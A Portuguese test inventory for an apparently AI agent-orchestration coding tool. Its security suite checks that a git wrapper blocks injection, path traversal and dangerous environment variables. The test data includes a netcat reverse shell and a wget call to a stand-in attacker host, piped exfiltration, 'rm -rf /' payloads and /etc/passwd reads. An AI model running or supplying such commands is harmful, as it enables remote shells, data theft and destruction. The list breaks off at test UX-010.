# 🧪 Inventário de Testes — GreenForge NEXUS v2.3

> **Gerado em:** 2026-05-19  
> **Fonte:** Documentação v2.3 (9 docs + CHANGELOG_HARDENING + INTEGRACAO)  
> **Stack de Testes:** Vitest · TypeScript · Next.js · SQLite WAL · Vitest mocks para `child_process`, `fs`, `execa`  
> **Finalidade:** Métrica numérica de conclusão do projeto (N testes passando / N total)

---

## Contagem Total

| Suite | Testes |
|---|:---:|
| 🛡️ SEC — Segurança e Blindagem de Shell (`secureGit`) | 38 |
| 🌀 RES — Resiliência de Infraestrutura (`BootReconciler` + Lifecycle) | 32 |
| 🔍 BIZ — Lógica de Negócio e Análise AST (`DiffLens`) | 21 |
| 🎨 UX — Performance e Fidelidade de Interface (`CodeMirror 6`) | 18 |
| **TOTAL** | **109** |

---

## 🛡️ Suite SEC — Segurança e Blindagem de Shell (`secureGit`)

> Cobre: `secure-git-wrapper.ts` v2.3, `FORBIDDEN_ENV_VARS`, `GIT_POLICY`, validação Zod, `buildSanitizedEnv()`, `validateFlag()`, `validateAndResolvePath()`, tabela de attack vectors (CVE-2026-3854, CVE-2026-25763, CVE-2025-68144, CVE-2023-29007, CVE-2017-8386).

---

### SEC-001 — Bloqueio de subcomando fora da allowlist
- **Cenário:** Chamar `secureGit({ subcommand: 'clone', args: [], worktreePath: '/proj' })`.
- **Assert:** Lança `SecurityError` com mensagem contendo `'not in allowlist'`; processo `git` nunca é instanciado (`execa` não é chamado).

### SEC-002 — Bloqueio de subcomando `config` (global)
- **Cenário:** `secureGit({ subcommand: 'config', args: ['--global', 'core.hooksPath', '/tmp/evil'], worktreePath })`.
- **Assert:** `SecurityError`; `execa` não chamado.

### SEC-003 — Bloqueio de flag explicitamente proibida: `log --output`
- **Cenário:** `secureGit({ subcommand: 'log', args: ['--output=/tmp/exfil.txt'], worktreePath })`.
- **Assert:** `SecurityError` com `'forbidden'` no body; cobre CVE-2026-25763.

### SEC-004 — Bloqueio de flag proibida: `diff --no-index`
- **Cenário:** `secureGit({ subcommand: 'diff', args: ['--no-index', 'file1', 'file2'], worktreePath })`.
- **Assert:** `SecurityError`; flag fora de worktree bloqueada.

### SEC-005 — Bloqueio de flag proibida: `diff --ext-diff`
- **Cenário:** `secureGit({ subcommand: 'diff', args: ['--ext-diff'], worktreePath })`.
- **Assert:** `SecurityError`; execução de diff handler externo impedida.

### SEC-006 — Bloqueio de flag proibida: `show --output`
- **Cenário:** `secureGit({ subcommand: 'show', args: ['--output=/tmp/leak.patch', 'HEAD'], worktreePath })`.
- **Assert:** `SecurityError`.

### SEC-007 — Bloqueio de flag proibida: `commit --template`
- **Cenário:** `secureGit({ subcommand: 'commit', args: ['--template=/etc/passwd'], worktreePath })`.
- **Assert:** `SecurityError`; leitura de arquivo externo bloqueada.

### SEC-008 — Flag com valor contendo token `exec:` nos format tokens
- **Cenário:** `secureGit({ subcommand: 'log', args: ['--format=exec:rm -rf /'], worktreePath })`.
- **Assert:** `SecurityError` com `'dangerous format token'`.

### SEC-009 — Flag desconhecida (não na allowlist, não na blocklist)
- **Cenário:** `secureGit({ subcommand: 'status', args: ['--unknownflag'], worktreePath })`.
- **Assert:** `SecurityError` com `'not in allowlist for git status'`.

### SEC-010 — Flag válida aceita normalmente: `log --oneline`
- **Cenário:** `secureGit({ subcommand: 'log', args: ['--oneline', '-n', '10'], worktreePath })` com worktree válido.
- **Assert:** Resolve sem erro; `execa` chamado com args `['-C', resolvedWorktree, 'log', '--oneline', '-n', '10']`.

### SEC-011 — Path traversal simples: `../../etc/passwd`
- **Cenário:** `secureGit({ subcommand: 'add', args: ['../../etc/passwd'], worktreePath: '/proj/worktree' })`.
- **Assert:** `SecurityError` com `'PATH_TRAVERSAL'`; `realpath` resolve para fora do worktree.

### SEC-012 — Path traversal via `git show HEAD:../../etc/passwd`
- **Cenário:** `secureGit({ subcommand: 'show', args: ['HEAD:../../etc/passwd'], worktreePath })`.
- **Assert:** `SecurityError`; policy de `show` não permite path args — bloqueado na classificação de args.

### SEC-013 — Path traversal via `git diff -- ../../.env`
- **Cenário:** `secureGit({ subcommand: 'diff', args: ['--', '../../.env'], worktreePath: '/proj/worktree' })`.
- **Assert:** `SecurityError` com `'outside worktree'`.

### SEC-014 — Path traversal via symlink no worktree
- **Cenário:** Criar symlink `/proj/worktree/link -> /etc`; chamar `secureGit({ subcommand: 'add', args: ['link/passwd'], worktreePath })`.
- **Assert:** `SecurityError`; `realpath` resolve symlink antes da comparação, bloqueando o escape.

### SEC-015 — `git log --remotes` bloqueado
- **Cenário:** `secureGit({ subcommand: 'log', args: ['--remotes'], worktreePath })`.
- **Assert:** `SecurityError`; regex `/^--remotes/` na policy de `log` detecta e rejeita.

### SEC-016 — Argumento com null byte
- **Cenário:** `secureGit({ subcommand: 'add', args: ['file\0evil'], worktreePath })`.
- **Assert:** Zod schema rejeita com `'Null byte not allowed'`; `SecurityError` antes de qualquer exec.

### SEC-017 — Argumento com newline
- **Cenário:** `secureGit({ subcommand: 'commit', args: ['-m', 'msg\nmalicious-trailer: value'], worktreePath })`.
- **Assert:** Zod schema rejeita com `'Newlines not allowed'`.

### SEC-018 — Excesso de argumentos além do `maxArgs`
- **Cenário:** `secureGit({ subcommand: 'status', args: ['-s', '--branch', '--extra', '--toomany'], worktreePath })` — `status.maxArgs = 2`.
- **Assert:** `SecurityError` com `'Too many args'`.

### SEC-019 — `BASH_ENV` removida antes do exec
- **Cenário:** Setar `process.env.BASH_ENV = '/tmp/evil.sh'`; executar `secureGit({ subcommand: 'status', args: [], worktreePath })`.
- **Assert:** Env passado ao `execa` não contém `BASH_ENV`; `evil.sh` nunca é invocado.

### SEC-020 — `GIT_PAGER` removida antes do exec
- **Cenário:** Setar `process.env.GIT_PAGER = 'wget http://attacker.com'`; executar `secureGit({ subcommand: 'log', args: ['--oneline'], worktreePath })`.
- **Assert:** Env passado ao `execa` não contém `GIT_PAGER`. Cobre CVE-2017-8386.

### SEC-021 — `PAGER` (fallback) removida
- **Cenário:** `process.env.PAGER = 'malicious_binary'`; `secureGit({ subcommand: 'log', ... })`.
- **Assert:** `PAGER` ausente no env sanitizado.

### SEC-022 — `LD_PRELOAD` removida (privesc bloqueado)
- **Cenário:** `process.env.LD_PRELOAD = '/tmp/inject.so'`; qualquer `secureGit(...)`.
- **Assert:** `LD_PRELOAD` ausente no env do `execa`.

### SEC-023 — `GIT_EXEC_PATH` removida (subcommand hijack bloqueado)
- **Cenário:** `process.env.GIT_EXEC_PATH = '/tmp/fake-git-bins'`; qualquer `secureGit(...)`.
- **Assert:** `GIT_EXEC_PATH` ausente; cobre RCE completo via redirecionamento de subcomandos.

### SEC-024 — `GIT_CONFIG_COUNT` removida (config injection bloqueado)
- **Cenário:** `process.env.GIT_CONFIG_COUNT = '1'; process.env.GIT_CONFIG_KEY_0 = 'core.pager'; process.env.GIT_CONFIG_VALUE_0 = 'rm -rf /'`.
- **Assert:** Todas as três vars ausentes no env sanitizado. Cobre CVE-2023-29007.

### SEC-025 — `GIT_SSH_COMMAND` removida
- **Cenário:** `process.env.GIT_SSH_COMMAND = 'nc attacker.com 4444 -e /bin/sh'`; `secureGit({ subcommand: 'status', ... })`.
- **Assert:** `GIT_SSH_COMMAND` ausente.

### SEC-026 — `GIT_TRACE` e `GIT_TRACE2` removidas
- **Cenário:** `process.env.GIT_TRACE = '/tmp/leak.log'; process.env.GIT_TRACE2 = '/tmp/leak2.log'`.
- **Assert:** Ambas ausentes no env sanitizado.

### SEC-027 — `GIT_TERMINAL_PROMPT` forçada para `'0'`
- **Cenário:** Qualquer `secureGit(...)` com ambiente limpo.
- **Assert:** `sanitizedEnv['GIT_TERMINAL_PROMPT'] === '0'`; modo não-interativo garantido.

### SEC-028 — Pipe shell bloqueado via AST (versão v2.2 legacy)
- **Cenário:** Testar `validateGitCommand('git status | nc attacker.com 4444', worktreePath)`.
- **Assert:** Retorna `false`; `validateASTNodeSafety` detecta nó `pipeline` no AST.

### SEC-029 — Command substitution bloqueada: `$(rm -rf /)`
- **Cenário:** `validateGitCommand('git add $(rm -rf /)', worktreePath)`.
- **Assert:** Retorna `false`; nó `command_substitution` detectado.

### SEC-030 — Backtick expansion bloqueada
- **Cenário:** `validateGitCommand('git add \`whoami\`', worktreePath)`.
- **Assert:** Retorna `false`; nó `command_substitution` detectado (tree-sitter representa ambas as formas como `command_substitution`).

### SEC-031 — Process substitution bloqueada: `<(...)`
- **Cenário:** `validateGitCommand('git diff <(cat /etc/passwd)', worktreePath)`.
- **Assert:** Retorna `false`; nó `process_substitution` detectado.

### SEC-032 — Background execution bloqueada: `&`
- **Cenário:** `validateGitCommand('git log &', worktreePath)`.
- **Assert:** Retorna `false`; nó `background` detectado.

### SEC-033 — `worktreePath` inexistente lança `SecurityError`
- **Cenário:** `secureGit({ subcommand: 'status', args: [], worktreePath: '/caminho/que/nao/existe' })`.
- **Assert:** `SecurityError` com `'Cannot resolve worktree'`; `realpath` rejeita o path.

### SEC-034 — `worktreePath` vazio rejeitado pelo Zod
- **Cenário:** `secureGit({ subcommand: 'status', args: [], worktreePath: '' })`.
- **Assert:** `SecurityError` via Zod (`min(1)` falha).

### SEC-035 — `redactSecrets()`: API key Gemini redatada em log
- **Cenário:** Passar string `'token AIzaSyAbcDEF1234567890XYZ'` para `redactSecrets()`.
- **Assert:** Retorna string com `'[REDACTED]'` no lugar da key; padrão `/AIza[A-Za-z0-9\-_]{35}/g` aplicado.

### SEC-036 — `redactSecrets()`: OpenAI key redatada
- **Cenário:** String `'Authorization: Bearer sk-abcdefghij1234567890ABCDEF'`.
- **Assert:** `[REDACTED]` substitui o token.

### SEC-037 — `assertPathWithinProject()` bloqueia escrita fora do worktree (T-01)
- **Cenário:** Chamar `assertPathWithinProject('/etc/passwd', '/proj/worktree')`.
- **Assert:** Lança `Error`; nenhuma operação de FS é executada.

### SEC-038 — `AgentFactory` emite alerta ao detectar alteração no system prompt de agente core (vuln #12)
- **Cenário:** Modificar `systemPrompt` de `technical_proposer` no AGENTS.md; disparar hot-reload via `chokidar`.
- **Assert:** SSE emite `AGENT_INTEGRITY_CHANGED` com `agentId: 'technical_proposer'`, `previousHash !== newHash`; `AuditLog` persiste ambos os hashes.

---

## 🌀 Suite RES — Resiliência de Infraestrutura (`BootReconciler` + Lifecycle)

> Cobre: `BootReconciler`, `writeIntent()`, `IntentPhase` state machine, `graceful-shutdown.ts` (8 estágios), `RuntimeContainer`, `CPGLoopDetector`, `PreExecutionGuard` (OCC + HMAC + epoch_id).

---

### RES-001 — `writeIntent()`: arquivo gravado atomicamente (fsync + rename POSIX)
- **Cenário:** Chamar `writeIntent(intent)` em ambiente normal; inspecionar o WAL dir.
- **Assert:** Arquivo `<txId>.json` existe; nenhum arquivo `.tmp` residual; conteúdo JSON parseável com `txId`, `phase: 'INTENT_WRITTEN'`.

### RES-002 — `writeIntent()`: SIGKILL entre `fsync` e `rename` deixa `.tmp` detectável
- **Cenário:** Mock `fs.renameSync` para lançar `SIGKILL` (process kill simulado); chamar `writeIntent()`.
- **Assert:** Arquivo `.tmp` existe; arquivo `.json` alvo não existe; `cleanOrphanedTempFiles()` subsequente remove o `.tmp` sem erro.

### RES-003 — `BootReconciler`: fase `INTENT_WRITTEN` → rollback limpo
- **Cenário:** Criar arquivo WAL com `phase: 'INTENT_WRITTEN'`; executar `bootReconciler(db)`.
- **Assert:** Phase atualizada para `ROLLED_BACK`; nenhum git stash executado; arquivo WAL deletado; DB não modificado.

### RES-004 — `BootReconciler`: fase `GIT_STASH_DONE` com stash válido → forward recovery
- **Cenário:** Criar arquivo WAL com `phase: 'GIT_STASH_DONE'`; mock `git stash list` retornando `intent.stashMessage`; executar `bootReconciler(db)`.
- **Assert:** DB update executado (worktree record atualizado); phase marcada `DB_COMMITTED`; arquivo WAL deletado.

### RES-005 — `BootReconciler`: fase `GIT_STASH_DONE` com stash ausente → rollback
- **Cenário:** WAL com `phase: 'GIT_STASH_DONE'`; mock `git stash list` retornando string vazia (stash não existe).
- **Assert:** Phase marcada `ROLLED_BACK`; DB não atualizado; arquivo WAL deletado.

### RES-006 — `BootReconciler`: fase `DB_COMMITTED` → apenas limpeza do arquivo WAL
- **Cenário:** Arquivo WAL com `phase: 'DB_COMMITTED'`; `bootReconciler(db)`.
- **Assert:** Nenhuma operação git ou DB; arquivo WAL deletado; nenhum erro emitido.

### RES-007 — `BootReconciler`: fase `ROLLED_BACK` → apenas limpeza
- **Cenário:** Arquivo WAL com `phase: 'ROLLED_BACK'`; `bootReconciler(db)`.
- **Assert:** Nenhuma operação; arquivo WAL deletado.

### RES-008 — `BootReconciler`: múltiplos intents pendentes processados em paralelo
- **Cenário:** 3 arquivos WAL simultâneos em fases `INTENT_WRITTEN`, `GIT_STASH_DONE`, `DB_COMMITTED`.
- **Assert:** Cada intent processado independentemente na ação correta; todos os arquivos WAL removidos ao fim; nenhum cross-contamination entre `txId`.

### RES-009 — `BootReconciler`: arquivo WAL corrompido (JSON inválido) é ignorado com warning
- **Cenário:** Criar arquivo `.json` no WAL dir com conteúdo `'not-valid-json'`; executar `bootReconciler(db)`.
- **Assert:** Processo não lança exceção; warning emitido no console; arquivo corrompido deletado ou ignorado (não bloqueia os demais intents).

### RES-010 — `BootReconciler` é a primeira chamada pós-abertura do DB
- **Cenário:** Inspecionar o código de inicialização do servidor (`server.ts` ou equivalente).
- **Assert:** `bootReconciler(db)` aparece antes de qualquer `app.listen()`, registro de handler HTTP, ou emissão SSE.

### RES-011 — SIGKILL na fase `INTENT_WRITTEN`: worktree e DB permanecem sincronizados após boot
- **Cenário:** Iniciar `beginCheckpoint()`; simular SIGKILL (kill -9 do processo); reiniciar servidor; `bootReconciler` executa.
- **Assert:** Nenhum git stash órfão existe; DB não contém registro do checkpoint; estado do worktree idêntico ao pré-operação.

### RES-012 — SIGKILL na fase `GIT_STASH_DONE`: DB atualizado no próximo boot
- **Cenário:** Executar `executeGitPhase()` com sucesso; simular SIGKILL antes de `executeDBPhase()`; reiniciar.
- **Assert:** `bootReconciler` detecta `GIT_STASH_DONE`; valida stash existe; re-executa DB update; sistema termina em estado consistente.

### RES-013 — `gracefulShutdown` estágio 1: para aceitar novas conexões HTTP
- **Cenário:** Chamar `gracefulShutdown('SIGTERM')`; tentar nova conexão HTTP após estágio 1.
- **Assert:** `server.close()` chamado; nova conexão recebe ECONNREFUSED ou 503; timeout de 2s respeitado.

### RES-014 — `gracefulShutdown` estágio 2: SSE streams recebem evento `shutdown`
- **Cenário:** 3 clientes SSE conectados; chamar `gracefulShutdown('SIGTERM')`.
- **Assert:** Cada stream recebe `event: shutdown\ndata: {"reason":"SIGTERM","reconnect":true}`; streams fechados; timeout de 1s respeitado.

### RES-015 — `gracefulShutdown` estágio 3: WebSocket recebe close frame 1001
- **Cenário:** 2 clientes WebSocket conectados; shutdown iniciado.
- **Assert:** `ws.send({ type: 'server-shutdown' })` e `ws.close(1001, 'Server shutting down')` chamados em ambos; timeout de 6s respeitado.

### RES-016 — `gracefulShutdown` estágio 4: agent loops aguardam round atual
- **Cenário:** Agente em mid-round de debate; shutdown iniciado.
- **Assert:** Flag `isShuttingDown = true` setada; round atual completa; próximo round não inicia; timeout de 15s respeitado.

### RES-017 — `gracefulShutdown` estágio 5: background workers fazem drain
- **Cenário:** Worker de checkpoint com 1 job em progresso; shutdown iniciado.
- **Assert:** `worker.drain()` chamado; job em progresso completa; nenhum novo job aceito; timeout de 15s.

### RES-018 — `gracefulShutdown` estágio 6: CodeMirror SSR destruído
- **Cenário:** `editorView` instanciado em contexto SSR; shutdown iniciado.
- **Assert:** `editorView.destroy()` chamado; workers Lezer não ficam em memória; timeout de 1s.

### RES-019 — `gracefulShutdown` estágio 7: Prisma desconectado após agents pararem
- **Cenário:** Verificar que estágio 7 (`prisma.$disconnect()`) só executa após estágio 4 (agents) finalizar.
- **Assert:** Ordem determinística; `prisma.$disconnect()` não chamado enquanto agent loop ativo.

### RES-020 — `gracefulShutdown` estágio 8: `wal_checkpoint(FULL)` executado
- **Cenário:** Escrever dados no WAL (writes não checkpointados); iniciar shutdown.
- **Assert:** `db.pragma('wal_checkpoint(FULL)')` chamado como última operação; resultado `{ busy: 0, checkpointed: N }`; `db.close()` chamado imediatamente após; timeout de 30s.

### RES-021 — `gracefulShutdown` estágio 8: checkpoint com páginas busy relança `TRUNCATE`
- **Cenário:** Mock `wal_checkpoint(FULL)` retornando `{ busy: 3, ... }`; shutdown executado.
- **Assert:** `db.pragma('wal_checkpoint(TRUNCATE)')` chamado como fallback; warning emitido.

### RES-022 — Ordem de shutdown do `RuntimeContainer`: menor `shutdownPriority` fecha primeiro
- **Cenário:** Registrar `GarbageCollector (0)`, `GitWorktreeManager (2)`, `WebSocketTransport (4)`, `SSETransport (5)`, `DebateOrchestrator (8)`, `AgentFactory (10)`, `PrismaClient (15)`.
- **Assert:** `shutdownAll()` chama `shutdown()` exatamente nessa ordem; mock verifica sequência.

### RES-023 — Componente com erro no shutdown não bloqueia o restante
- **Cenário:** `GarbageCollector.shutdown()` lança exceção; demais componentes normais.
- **Assert:** Erro logado com `console.error`; shutdown continua para `GitWorktreeManager` e demais; nenhum `uncaughtException` não tratado.

### RES-024 — `PreExecutionGuard`: epoch mismatch invalida gate
- **Cenário:** Emitir gate com `epoch_id: 5`; servidor reiniciado → `currentEpochId: 6`; cliente envia APPROVE com payload original.
- **Assert:** `validateGateConsistency` retorna `{ valid: false, reason: /reinicializado/ }`; SSE emite `GATE_VALIDATION_FAILED`; debate não continua.

### RES-025 — `PreExecutionGuard`: HMAC adulterado invalida gate
- **Cenário:** Gate emitido com HMAC correto; cliente modifica `payload.stateHash` sem atualizar `gateHMAC`; envia APPROVE.
- **Assert:** HMAC recalculado diverge; `{ valid: false, reason: /HMAC/ }`; execução bloqueada.

### RES-026 — `PreExecutionGuard`: state mutation entre emissão e aprovação invalida gate
- **Cenário:** Gate emitido com `stateHash = H1`; `STEER_AGENT` muda estado → `currentStateHash = H2`; cliente envia APPROVE.
- **Assert:** `{ valid: false, reason: /Estado.*mudou/ }`; gate rejeitado.

### RES-027 — `PreExecutionGuard`: worktree divergiu invalida gate
- **Cenário:** Gate emitido com `worktreeHash = W1`; arquivo modificado externamente → `currentWorktreeHash = W2`; APPROVE enviado.
- **Assert:** `{ valid: false, reason: /Arquivos.*alterados/ }`; gate rejeitado.

### RES-028 — `PreExecutionGuard`: gate válido (epoch, HMAC, state, worktree OK) aprova e continua debate
- **Cenário:** Nenhuma mutação de estado entre T e T+Δ; APPROVE enviado com payload inalterado.
- **Assert:** `{ valid: true }`; `continueDebate()` chamado; SSE não emite `GATE_VALIDATION_FAILED`.

### RES-029 — `CPGLoopDetector`: instância separada por `agentId`
- **Cenário:** Criar duas instâncias de `CPGLoopDetector` para `agentId: 'proposer'` e `agentId: 'critic'`; injetar histórico apenas na instância do proposer.
- **Assert:** `detectLoop()` na instância do critic retorna `{ isLoop: false }`; sem cross-contamination.

### RES-030 — `CPGLoopDetector`: threshold abaixo de 0.85 não dispara falso positivo
- **Cenário:** Dois snippets com CPG similarity = 0.80 (abaixo do threshold default); `detectLoop()`.
- **Assert:** `{ isLoop: false }`; nenhuma escalada ao árbitro.

### RES-031 — `CPGLoopDetector`: paradigm-shift (recursão → iteração) com outputs idênticos detectado como loop
- **Cenário:** Snippet A (recursão); Snippet B (iteração equivalente); `computeCPGSimilarity >= 0.90`; Execution Oracle roda testes → outputs idênticos.
- **Assert:** `{ isLoop: true, type: 'CPG_CYCLE', recommendation: /constraint/ }`.

### RES-032 — `CPGLoopDetector`: paradigm-shift com outputs divergentes aceito como refatoração genuína
- **Cenário:** CPG similarity acima do threshold; Execution Oracle roda testes → outputs divergem.
- **Assert:** `{ isLoop: false }`; nenhuma escalada; refatoração tratada como mudança legítima.

---

## 🔍 Suite BIZ — Lógica de Negócio e Análise AST (`DiffLens`)

> Cobre: `DiffLens` (Gate HITL 2), aprovação/rejeição de chunks, rollback all-or-nothing pós-merge, contrato de squash merge, análise estática de dependências órfãs, `CostGuardrail`, `AutoFixLimiter`.

---

### BIZ-001 — Chunk aprovado individualmente atualiza `approvedChunks` no payload
- **Cenário:** Gate 2 ativo com 5 chunks; usuário aprova chunks `[chunk-1, chunk-3]`; envia `HITL_DECISION { approvedChunks: ['chunk-1', 'chunk-3'], rejectedChunks: ['chunk-2', 'chunk-4', 'chunk-5'] }`.
- **Assert:** `resolveHITL` atualiza estado com `approvedChunks`; apenas as alterações dos chunks aprovados entram no merge; chunks rejeitados descartados.

### BIZ-002 — Chunk rejeitado não entra no merge (contrato all-or-nothing por chunk)
- **Cenário:** 3 chunks; chunk-2 rejeitado; merge executado.
- **Assert:** Diff final não contém linhas do chunk-2; chunks 1 e 3 presentes no commit.

### BIZ-003 — Rejeição de chunk que remove `import` cria dependência órfã: AST detecta e alerta
- **Cenário:** Chunk A adiciona `import { MyService } from './my-service'`; Chunk B usa `MyService` em função. Usuário aprova Chunk B, rejeita Chunk A.
- **Assert:** Análise AST pós-rejeição detecta `MyService` referenciado mas não importado; alerta `RED_FLAG` do tipo `ORPHAN_DEPENDENCY` emitido via SSE antes de finalizar o merge.

### BIZ-004 — Rejeição de chunk que remove função usada em outro chunk: alerta de referência morta
- **Cenário:** Chunk A define `function helperFn()`; Chunk B chama `helperFn()`. Chunk A rejeitado, Chunk B aprovado.
- **Assert:** AST detecta chamada a `helperFn` sem definição correspondente; alerta `DEAD_REFERENCE` emitido.

### BIZ-005 — Rejeição de chunk que remove `export`: módulo filho fica com import quebrado
- **Cenário:** Chunk A remove `export const config`; outro arquivo (não no debate) importa `config`. Chunk A aprovado.
- **Assert:** Análise de dependência reversa detecta `config` removido com importadores existentes; alerta emitido com lista de arquivos afetados.

### BIZ-006 — Aprovação total de todos os chunks resulta em merge limpo sem alertas
- **Cenário:** 4 chunks; todos aprovados; nenhuma dependência órfã introduzida.
- **Assert:** Merge executado; nenhum alerta de dependência; `MergeEvent` criado no DB; SSE emite `MERGE_COMPLETED`.

### BIZ-007 — Gate HITL é bloqueador síncrono: debate não avança sem decisão
- **Cenário:** `APPROVAL_MODE=manual`; debate atinge Gate 2; nenhuma decisão enviada.
- **Assert:** Promise de Gate 2 permanece pending; nenhum evento `AGENT_TOKEN` ou `MERGE_COMPLETED` emitido; timeout de 5s sem avanço.

### BIZ-008 — Gate HITL: rejeição total aborta merge e inicia nova rodada
- **Cenário:** Gate 2; usuário envia `decision: REJECT` com todos os chunks rejeitados.
- **Assert:** `abortDebate` chamado; SSE emite `DEBATE_ABORTED`; nenhum commit criado; `MergeEvent` não persiste.

### BIZ-009 — Rollback pós-merge disponível por 30 minutos
- **Cenário:** Merge completado; `Date.now() + 29min`; cliente solicita rollback.
- **Assert:** Botão "↩ Desfazer" ainda visível; `revert()` executável; `git revert HEAD --no-edit` invocado; `MergeEvent.revertedAt` preenchido; SSE emite `MERGE_REVERTED`.

### BIZ-010 — Rollback pós-30-minutos movido para "Histórico de Ações" (sempre acessível)
- **Cenário:** `Date.now() + 31min` após merge; cliente verifica visibilidade do botão.
- **Assert:** Botão não visível na Timeline ativa; acessível em seção "Histórico de Ações"; `revert()` ainda funcional.

### BIZ-011 — Merge squash é all-or-nothing: comunicado explicitamente no Gate 2
- **Cenário:** Gate 2 (`DIFF_REVIEW`) emitido; inspecionar payload da `ApprovalCardData`.
- **Assert:** Payload contém aviso de contrato squash (texto ou campo `squashWarning`); usuário não pode reverter chunk individual após merge — apenas o merge completo.

### BIZ-012 — `APPROVAL_MODE=yolo` bypassa todos os gates
- **Cenário:** `APPROVAL_MODE=yolo`; debate atinge Gate 2.
- **Assert:** Promise de Gate resolvida automaticamente com `APPROVE`; merge executado sem interação do usuário; nenhuma emissão de `HITL_GATE` via SSE.

### BIZ-013 — `APPROVAL_MODE=auto_edit`: Gate 2 auto-aprova chunks sem Red Flags
- **Cenário:** `APPROVAL_MODE=auto_edit`; Gate 2 com 3 chunks, nenhum Red Flag.
- **Assert:** Todos os chunks auto-aprovados; merge executado; nenhuma interação de usuário requerida.

### BIZ-014 — `APPROVAL_MODE=auto_edit`: chunk com Red Flag pausa para aprovação manual
- **Cenário:** `APPROVAL_MODE=auto_edit`; Gate 2 com chunk que modifica `package.json` (Red Flag CRÍTICO).
- **Assert:** Auto-aprovação suspensa; SSE emite `HITL_GATE` com `gateType: 'DIFF_REVIEW'`; usuário deve aprovar manualmente.

### BIZ-015 — Red Flag CRÍTICO: deleção de arquivo sempre pausa em qualquer `APPROVAL_MODE`
- **Cenário:** `APPROVAL_MODE=yolo`; chunk contém `rm` ou `unlink`; Gate 2.
- **Assert:** Gate pausado mesmo em modo yolo; `HITL_GATE` emitido; nenhum auto-approve.

### BIZ-016 — `CostGuardrail`: budget do árbitro limitado a 20% do `perTaskBudgetTokens`
- **Cenário:** `perTaskBudgetTokens = 50_000`; árbitro tenta chamada que ultrapassaria 10.001 tokens (>20%).
- **Assert:** Gate `ROLE_BUDGET_EXCEEDED` emitido antes da chamada LLM; chamada não executada.

### BIZ-017 — `CostGuardrail`: budget diário esgotado pausa todas as sessões
- **Cenário:** `dailyBudgetUsd = 5.00`; acumulado de chamadas atinge $5.01.
- **Assert:** SSE emite alerta de budget; nenhuma nova chamada LLM iniciada; todas as sessões pausadas.

### BIZ-018 — `CostGuardrail`: requisição de 1M tokens dispara Gate de custo
- **Cenário:** `LazyContextLoader` tentaria elevar `contextBudget = 1_000_000` silenciosamente sem gate.
- **Assert:** `Error: ExtendedBudgetRequiresApproval` lançado; Gate `COST_APPROVAL` emitido; nenhuma chamada com 1M tokens sem aprovação explícita.

### BIZ-019 — `AutoFixLimiter`: 4ª tentativa de auto-fix dispara Gate em vez de nova chamada LLM
- **Cenário:** Forçar 3 falhas de auto-fix consecutivas; iniciar 4ª tentativa.
- **Assert:** `AutoFixAttempt.attemptNumber <= 3` validado; na 4ª falha, Gate `AUTO_FIX_LIMIT` emitido; nenhuma 5ª chamada LLM.

### BIZ-020 — `resolveHITL` é idempotente: aprovação duplicada do mesmo `gateId` não re-executa
- **Cenário:** Enviar `HITL_DECISION { gateId: 'gate-123', decision: APPROVE }` duas vezes (duplicata de rede).
- **Assert:** Segunda chamada detectada via set de `gateId` resolvidos; `continueDebate()` chamado apenas uma vez; nenhum merge duplicado.

### BIZ-021 — `OutboxEvent`: payload do Gate serializado no DB antes de emissão SSE
- **Cenário:** Inspecionar fluxo de emissão de `HITL_GATE`; simular queda do cliente após `INSERT OutboxEvent` mas antes da emissão SSE.
- **Assert:** `OutboxEvent` com `type: 'HITL_GATE'` e payload completo persiste no DB; cliente pode solicitar redelivery via `Last-Event-ID`; Gate hydration re-emite o payload correto.

---

## 🎨 Suite UX — Performance e Fidelidade de Interface (`CodeMirror 6`)

> Cobre: `AgentTagWidget.eq()`, `updateDOM()`, `toDOM()`, `destroy()`, headers COOP/COEP, `RAFBufferedSSEConsumer`, fallback de `SharedArrayBuffer`, `ThreadedParser`, idempotência de decorations.

---

### UX-001 — Header `Cross-Origin-Opener-Policy: same-origin` presente na resposta do servidor
- **Cenário:** `curl -I http://localhost:5174/` (ou endpoint principal da app Next.js).
- **Assert:** Header `Cross-Origin-Opener-Policy: same-origin` presente; essencial para `SharedArrayBuffer` no browser.

### UX-002 — Header `Cross-Origin-Embedder-Policy: require-corp` presente
- **Cenário:** Mesma request do UX-001.
- **Assert:** Header `Cross-Origin-Embedder-Policy: require-corp` presente; sem ele `SharedArrayBuffer` bloqueado mesmo com COOP correto.

### UX-003 — Ambos os headers COOP/COEP presentes em ambiente de produção (Nginx/Caddy)
- **Cenário:** Request ao servidor de produção ou staging.
- **Assert:** Ambos `COOP` e `COEP` presentes; checklist de DevOps/SRE satisfeito.

### UX-004 — `SharedArrayBuffer` disponível quando COOP/COEP ativos
- **Cenário:** Contexto de browser com headers corretos; verificar `typeof SharedArrayBuffer`.
- **Assert:** `typeof SharedArrayBuffer === 'function'`; `ThreadedParser` do CodeMirror 6 inicializado com sucesso.

### UX-005 — Fallback gracioso quando `SharedArrayBuffer` indisponível
- **Cenário:** Simular ambiente sem Cross-Origin-Isolation (headers ausentes); inicializar o editor.
- **Assert:** Editor não lança exceção; badge `⚠️ Parser offline — realce de sintaxe desativado` exibido; console registra `[CodeMirror] SharedArrayBuffer unavailable. Parser disabled. Reason: Cross-Origin-Isolation not active.`

### UX-006 — Edição de código funciona em fallback plaintext (sem parser)
- **Cenário:** `SharedArrayBuffer` indisponível; usuário digita código no editor.
- **Assert:** Teclas registradas normalmente; conteúdo atualizado no `EditorState`; sem highlight de sintaxe, mas sem crashes.

### UX-007 — Restauração do parser após ativar COOP/COEP + F5 (sem rebuild)
- **Cenário:** Headers ausentes → F5 → headers presentes; verificar estado do `ThreadedParser`.
- **Assert:** Parser reativado na recarga; `SharedArrayBuffer` disponível; highlight de sintaxe funcional; nenhuma mensagem de erro residual.

### UX-008 — `AgentTagWidget.eq()`: widgets com mesmo `agentId` e `status` retornam `true`
- **Cenário:** `widgetA = new AgentTagWidget({ agentId: 'proposer', status: 'thinking', label: 'Proposer' })`; `widgetB = new AgentTagWidget({ agentId: 'proposer', status: 'thinking', label: 'Proposer' })`. Chamar `widgetA.eq(widgetB)`.
- **Assert:** Retorna `true`; CodeMirror reutiliza o DOM node sem recriar.

### UX-009 — `AgentTagWidget.eq()`: widgets com `status` diferente retornam `false`
- **Cenário:** `widgetA.status = 'thinking'`; `widgetB.status = 'done'`. Chamar `widgetA.eq(widgetB)`.
- **Assert:** Retorna `false`; CodeMirror chama `updateDOM()` em vez de `toDOM()`.

### UX-010 — `AgentTagWidget.eq()`: `lineFrom`/`lineTo` diferentes não afetam resultado (posição é gerida pelo CM)
